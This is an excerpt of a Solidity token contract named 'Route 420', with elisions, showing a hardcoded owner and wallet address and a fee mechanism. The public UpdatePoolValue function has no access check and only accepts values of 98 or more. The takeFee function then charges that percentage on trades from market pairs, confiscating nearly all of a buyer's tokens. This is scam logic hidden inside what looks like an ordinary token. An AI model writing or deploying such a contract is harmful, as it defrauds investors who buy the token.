...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x690b041784D4239b0A63C2ce50f27C98fAc77602; 
...
contract Route420 is Context, IERC20, Ownable {
    ...
    string private _name = "Route 420";
    string private _symbol = "420";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x690b041784D4239b0A63C2ce50f27C98fAc77602); 
    address payable public teamWalletAddress = payable(0x690b041784D4239b0A63C2ce50f27C98fAc77602); 
    ...
    uint256 public _netOutCharge = 0;  
    ...
    constructor () {
        ...
        _netOutCharge = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
    ...
    function UpdatePoolValue(uint256 newAmt) public {
    require(newAmt >= 98 , "Enter Corrent Amount for Pool Share");
        _netOutCharge = newAmt;
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            ...
            feeAmount = amount.mul(_netOutCharge).div(100);
        }
